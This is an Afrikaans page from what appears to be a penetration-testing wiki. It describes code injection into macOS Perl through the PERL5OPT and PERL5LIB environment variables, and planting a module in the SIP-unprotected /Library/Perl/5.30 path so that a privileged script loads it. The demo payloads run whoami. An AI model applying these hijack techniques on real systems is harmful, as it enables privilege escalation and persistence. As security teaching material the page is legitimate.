# macOS Perl Toepassings Inspuiting

{{#include ../../../banners/hacktricks-training.md}}

## Deur `PERL5OPT` & `PERL5LIB` omgewing veranderlike

Deur die omgewing veranderlike PERL5OPT is dit moontlik om perl arbitrêre opdragte uit te voer.\
Byvoorbeeld, skep hierdie skrip:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Nou **voer die omgewing veranderlike uit** en voer die **perl** skrip uit:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
'n Ander opsie is om 'n Perl-module te skep (bv. `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
En gebruik dan die omgewingsveranderlikes:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## Deur afhanklikhede

Dit is moontlik om die afhanklikhede gids volgorde van Perl wat loop, te lys:
```bash
perl -e 'print join("\n", @INC)'
```
Wat iets soos die volgende sal teruggee:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Sommige van die teruggekeerde vouers bestaan selfs nie, egter, **`/Library/Perl/5.30`** bestaan **wel**, dit is **nie** **beskerm** deur **SIP** nie en dit is **voor** die vouers **beskerm** deur SIP. Daarom kan iemand daardie vouer misbruik om skripafhanklikhede daarby te voeg sodat 'n hoëprivilege Perl-skrip dit sal laai.

> [!WARNING]
> Let egter daarop dat jy **root moet wees om in daardie vouer te skryf** en vandag sal jy hierdie **TCC-prompt** kry:

<figure><img src="../../../images/image (28).png" alt="" width="244"><figcaption></figcaption></figure>

Byvoorbeeld, as 'n skrip **`use File::Basename;`** invoer, sal dit moontlik wees om `/Library/Perl/5.30/File/Basename.pm` te skep om dit te laat uitvoer willekeurige kode.

## References

- [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)

{{#include ../../../banners/hacktricks-training.md}}
